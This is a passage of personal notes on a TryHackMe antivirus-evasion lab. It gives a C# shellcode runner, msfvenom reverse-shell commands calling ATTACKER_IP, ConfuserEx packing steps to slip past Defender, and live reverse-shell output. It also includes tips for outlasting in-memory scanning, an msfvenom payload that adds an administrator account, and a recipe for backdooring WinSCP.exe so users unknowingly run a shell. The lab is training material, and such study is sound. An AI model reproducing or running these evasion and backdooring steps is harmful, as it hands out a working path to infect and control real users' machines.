    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

This payload takes a shellcode generated by msfvenom and runs it into a separate thread. For this to work, you'll need to generate a new shellcode and put it into the shellcode variable of the code:

```

Command Prompt

C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp


```

You can then compile your payload in the Windows machine using the following command:

```

Command Prompt

C:\> csc UnEncStagelessPayload.cs


```

Once you have a working executable, you can try uploading it to the THM Antivirus Check! page (link on the desktop). It should be flagged by the AV immediately. Let's use a packer on the same payload and see what happens.

We will use the [ConfuserEx](https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0) packer for this task, as our payloads are programmed on .NET. For your convenience, you can find a shortcut on your desktop to it.

ConfuserEx will require you to indicate the folders in which it will work. Be sure to select your desktop as the base directory, as shown in the image below. Once the base directory is set up, drag and drop the executable you want to pack on the interface, and you should end up with the following:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9214df2a88ffffbf8561502aa19a375c.png)

Let's go to the settings tab and select our payload. Once selected, hit the "+" button to add settings to your payload. This should create a rule named "true". Make sure to enable compression as well:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/857e5540e14f4ebf743fbd4d2f8ee503.png)

We will now edit the "true" rule and set it to the Maximum preset:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/96946f1aff585a91e78408b96e446ea4.png)

Finally, we will go to the "Protect!" tab and hit "Protect":

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e0e3ca97245641d3954f26fa986aae87.png)

The new payload should be ready and hopefully won't trigger any alarms when uploaded to the THM Antivirus Checker! (*shortcut available on your desktop*). In fact, if you execute your payload and set up an nc listener, you should be able to get a shell back:

```

AttackBox

user@attackbox$ nc -lvp 7478


```

```
PS C:\Tools\CS Files> csc.exe .\UnEncStagelessPayload.cs
Microsoft (R) Visual C# Compiler version 4.8.3761.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

then upload to confuser to protect it, now using smb to get the .exe

┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username thm -password Password321 public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.195.70,50207)
[*] AUTHENTICATE_MESSAGE (AV-EVASION-PC\thm,AV-EVASION-PC)
[*] User AV-EVASION-PC\thm authenticated successfully
[*] thm::AV-EVASION-PC:aaaaaaaaaaaaaaaa:98a2e1b9cf863ed62fb7b5309fe37968:01010000000000000072514bfcc9d80145140b052f6c743f000000000100100055005a004a00640069004400510074000300100055005a004a0064006900440051007400020010006c0047007700410046004b0068006200040010006c0047007700410046004b0068006200070008000072514bfcc9d80106000400020000000800300030000000000000000000000000200000c4c787e45b18d5bbaf1eeb4e73b04318e169500bed066dd6c64813c1f68ba5a80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.195.70,50207)
[*] Remaining connections []
[*] Incoming connection (10.10.195.70,50210)
[*] AUTHENTICATE_MESSAGE (AV-EVASION-PC\thm,AV-EVASION-PC)
[*] User AV-EVASION-PC\thm authenticated successfully
[*] thm::AV-EVASION-PC:aaaaaaaaaaaaaaaa:ec0ed0ef028296de7f6922dc701ea740:010100000000000000f62863fcc9d8014cf011f3d4da3198000000000100100055005a004a00640069004400510074000300100055005a004a0064006900440051007400020010006c0047007700410046004b0068006200040010006c0047007700410046004b00680062000700080000f62863fcc9d80106000400020000000800300030000000000000000000000000200000c4c787e45b18d5bbaf1eeb4e73b04318e169500bed066dd6c64813c1f68ba5a80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:public)
[*] Disconnecting Share(1:public)
[*] Closing down connection (10.10.195.70,50210)
[*] Remaining connections []
[*] Incoming connection (10.10.195.70,50344)
[*] AUTHENTICATE_MESSAGE (AV-EVASION-PC\thm,AV-EVASION-PC)
[*] User AV-EVASION-PC\thm authenticated successfully
[*] thm::AV-EVASION-PC:aaaaaaaaaaaaaaaa:1cbeed54deb8c0bcc8b3d887b401a091:010100000000000000b5c00c06cad801e3b1cda7e5c6f8d0000000000100100055005a004a00640069004400510074000300100055005a004a0064006900440051007400020010006c0047007700410046004b0068006200040010006c0047007700410046004b00680062000700080000b5c00c06cad80106000400020000000800300030000000000000000000000000200000c4c787e45b18d5bbaf1eeb4e73b04318e169500bed066dd6c64813c1f68ba5a80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.195.70,50344)
[*] Remaining connections []

C:\Users\thm\Desktop\Confused>copy "C:\Users\thm\Desktop\Confused\UnEncStagelessPayload.exe" \\10.11.81.220\public\
        1 file(s) copied.

┌──(kali㉿kali)-[~/share]
└─$ nc -lvp 7478                                                                    
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7478
Ncat: Listening on 0.0.0.0:7478
Ncat: Connection from 10.10.195.70.
Ncat: Connection from 10.10.195.70:50345.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\App>whoami
whoami
av-evasion-pc\av-victim


```

![[Pasted image 20220916145635.png]]

So far, so good, but remember we talked about AVs doing in-memory scanning? If you try running a command on your reverse shell, the AV will notice your shell and kill it. This is because Windows Defender will hook certain Windows API calls and do in-memory scanning whenever such API calls are used. In the case of any shell generated with msfvenom, CreateProcess() will be invoked and detected.

So what do we do now?

While defeating in-memory scanning is out of the scope of this room, there are a couple of simple things you can do to avoid detection:

    Just wait a bit. Try spawning the reverse shell again and wait for around 5 minutes before sending any command. You'll see the AV won't complain anymore. The reason for this is that scanning memory is an expensive operation. Therefore, the AV will do it for a while after your process starts but will eventually stop.
    Use smaller payloads. The smaller the payload, the less likely it is to be detected. If you use msfvenom to get a single command executed instead of a reverse shell, the AV will have a harder time detecting it. You can try with msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp and see what happens.

If detection isn't an issue, you can even use a simple trick. From your reverse shell, run cmd.exe again. The AV will detect your payload and kill the associated process, but not the new cmd.exe you just spawned.

While every single AV will behave differently, most of the time, there will be a similar way around them, so it's worth exploring any weird behaviors you notice while testing.


Will packers help you obfuscate your malicious code to bypass AV solutions? (yea/nay)
*yea*



Will packers often unpack the original code in-memory before running it? (yea/nay)
*yea*



Are some packers detected as malicious by some AV solutions? (yea/nay)
*yea*



Follow the instructions to create a packed payload and upload it into the THM Antivirus Check at http://10.10.195.70/


### Binders 

While not an AV bypass method, binders are also important when designing a malicious payload to be distributed to end users. A binder is a program that merges two (or more) executables into a single one. It is often used when you want to distribute your payload hidden inside another known program to fool users into believing they are executing a different program.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5c72d80a077a1f8a813a70c01a6561e9.png)

While every single binder might work slightly differently, they will basically add the code of your shellcode inside the legitimate program and have it executed somehow.

You could, for example, change the entry point in the PE header so that your shellcode executes right before the program and then redirect the execution back to the legitimate program once it is finished. This way, when the user clicks the resulting executable, your shellcode will get silently executed first and continue running the program normally without the user noticing it.

Binding with msfvenom

You can easily plant a payload of your preference in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently. The method used by msfvenom injects your malicious program by creating an extra thread for it, so it is slightly different from what was mentioned before but achieves the same result. Having a separate thread is even better since your program won't get blocked in case your shellcode fails for some reason.

	For this task, we will be backdooring the WinSCP executable available at C:\Tools\WinSCP.

To create a backdoored WinSCP.exe we can use the following command on our Windows machine:

Note: Metasploit is installed in the Windows machine for your convenience, but it might take up to three minutes to generate the payload (the produced warnings can be safely ignored).

```

AttackBox

C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe


```

The resulting WinSCP-evil.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Before anything else, remember to set up an nc listener to receive the reverse shell. When you execute your backdoored executable, it should launch a reverse shell back at you while continuing to execute WinSCP.exe for the user:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c3bd06d935a937b2af7dace6a41a27.png)

```

AttackBox

user@attackbox$ nc -lvp 7779      
Listening on 0.0.0.0 7779
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

```
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username thm -password Password321 public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

C:\Tools\WinSCP>copy "C:\Tools\WinSCP\WinSCP.exe" \\10.11.81.220\public\
        1 file(s) copied.

──(kali㉿kali)-[~/asm]
└─$ msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=10.11.81.220 lport=7779 -f exe -o WinSCP-evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload

Payload size: 324 bytes
Final size of exe file: 35506176 bytes
Saved as: WinSCP-evil.exe

```

Binders and AV

Binders won't do much to hide your payload from an AV solution. The simple fact of joining two executables without any changes means that the resulting executable will still trigger any signature that the original payload did.

The main use of binders is to fool users into believing they are executing a legitimate executable rather than a malicious payload.

When creating a real payload, you may want to use encoders, crypters, or packers to hide your shellcode from signature-based AVs and then bind it into a known executable so that the user doesn't know what is being executed.

Feel free to try and upload your bound executable to the THM Antivirus Check website (link available on your desktop) without any packing, and you should get a detection back from the server, so this method won't be of much help when trying to get the flag from the server by itself.


Will a binder help with bypassing AV solutions? (yea/nay)
*nay*



Can a binder be used to make a payload appear as a legitimate executable? (yea/nay)
*yea*

### Conclusion 



In this room, we have explored some strategies available to an attacker to circumvent AV engines that rely on disk-based detection only. While this is just one of the mechanisms available to any modern AV engine, we should be able to at least deliver our payloads to our victim's disk as a first step. Bypassing in-memory detection and other advanced detection mechanisms are left for a future room. You may want to check the Runtime Detection Evasion for more information on bypassing further Windows security mechanisms that may prevent your payloads from triggering.

Remember that the success of any encrypter, encoder or packer, will largely depend on AV engines not knowing any signatures for them. Therefore, being able to customize your own payloads is critical when trying to bypass any real-world solution.


Click and continue learning!

[[Abusing Windows Internals]]